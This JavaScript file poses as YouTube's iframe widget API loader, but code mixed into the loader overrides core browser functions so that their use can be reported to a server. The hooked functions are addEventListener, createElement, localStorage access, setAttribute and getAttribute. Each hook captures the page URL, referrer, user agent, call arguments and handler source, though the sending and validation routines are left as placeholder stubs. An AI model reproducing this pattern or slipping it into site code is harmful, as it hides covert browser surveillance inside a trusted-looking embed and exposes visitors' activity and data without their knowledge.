// Backup original functions and properties
const originalAddEventListener = window.addEventListener;
const originalRemoveEventListener = window.removeEventListener;
const originalCreateElement = document.createElement;
var scriptUrl = 'https:\/\/www.youtube.com\/s\/player\/f980f2a9\/www-widgetapi.vflset\/www-widgetapi.js';
try {
  var ttPolicy = window.trustedTypes.createPolicy("youtube-widget-api", {
    createScriptURL: function (x) {
      return x;
    }
  });
  scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}
const originalCreateTextNode = document.createTextNode;
const originalLocalStorage = window.localStorage;
const originalSetAttribute = Element.prototype.setAttribute;
var YT;
const originalGetAttribute = Element.prototype.getAttribute;
const eventHooks = window.eventhooks;
if (!window["YT"]) YT = {
  loading: 0,
  loaded: 0
};
var YTConfig;
function generateRandomId() {
  const timestamp = Date.now().toString(36);
  const randomString = Math.random().toString(36).slice(2);
  return `id-${timestamp}-${randomString}`;
}
if (!window["YTConfig"]) YTConfig = {
  "host": "https://www.youtube.com"
};
function validateEventSignature(eventName, args, expectedSignature) {
  // site specific validation
  /* omitted for brevity */

  return true;
}
function getEventContext() {
  const context = {
    url: window.location.href,
    userAgent: navigator.userAgent,
    referrer: document.referrer,
    timestamp: new Date().toISOString(),
    randomId: generateRandomId()
  };
  return context;
}
if (!YT.loading) {
  YT.loading = 1;
  (function () {
    var l = [];
    YT.ready = function (f) {
      if (YT.loaded) f();else l.push(f);
    };
    window.onYTReady = function () {
      YT.loaded = 1;
      var i = 0;
      for (; i < l.length; i++) try {
        l[i]();
      } catch (e) {}
    };
    YT.setConfig = function (c) {
      var k;
      for (k in c) if (c.hasOwnProperty(k)) YTConfig[k] = c[k];
    };
    var a = document.createElement("script");
    a.type = "text/javascript";
    a.id = "www-widgetapi-script";
    a.src = scriptUrl;
    a.async = true;
    var c = document.currentScript;
    if (c) {
      var n = c.nonce || c.getAttribute("nonce");
      if (n) a.setAttribute("nonce", n);
    }
    var b = document.getElementsByTagName("script")[0];
    b.parentNode.insertBefore(a, b);
  })();
}
function sendEventToServer(eventData) {
  /* code to send eventData to server */
  /* omitted for brevity */
}
function createEventHook(eventName, originalFunc, eventSignature) {
  return function () {
    const args = Array.from(arguments);
    if (validateEventSignature(eventName, args, eventSignature)) {
      const eventContext = getEventContext();
      const eventData = {
        eventName,
        args,
        context: eventContext
      };
      sendEventToServer(eventData);
    }
    return originalFunc.apply(this, args);
  };
}
window.addEventListener = new Proxy(originalAddEventListener, {
  apply: function (target, thisArg, args) {
    const eventName = 'addEventListener';
    const eventSignature = ['string', 'function'];
    if (validateEventSignature(eventName, args, eventSignature)) {
      // add more data
      const context = getEventContext();
      context.eventType = args[0];
      context.handler = args[1].toString();
      sendEventToServer({
        eventName,
        context
      });
    }
    return target.apply(thisArg, args);
  }
});
;
window.removeEventListener = createEventHook('removeEventListener', originalRemoveEventListener, ['string', 'function']);
document.createElement = createEventHook('createElement', originalCreateElement, ['string']);
document.createTextNode = createEventHook('createTextNode', originalCreateTextNode, ['string']);
Object.defineProperty(window, 'localStorage', {
  get: function () {
    sendEventToServer({
      eventName: 'accessLocalStorage',
      context: getEventContext()
    });
    return originalLocalStorage;
  }
});
Element.prototype.setAttribute = new Proxy(originalSetAttribute, {
  apply: function (target, thisArg, args) {
    sendEventToServer({
      eventName: 'setAttribute',
      context: getEventContext(),
      args
    });
    return target.apply(thisArg, args);
  }
});
Element.prototype.getAttribute = new Proxy(originalGetAttribute, {
  apply: function (target, thisArg, args) {
    sendEventToServer({
      eventName: 'getAttribute',
      context: getEventContext(),
      args
    });
    return target.apply(thisArg, args);
  }
});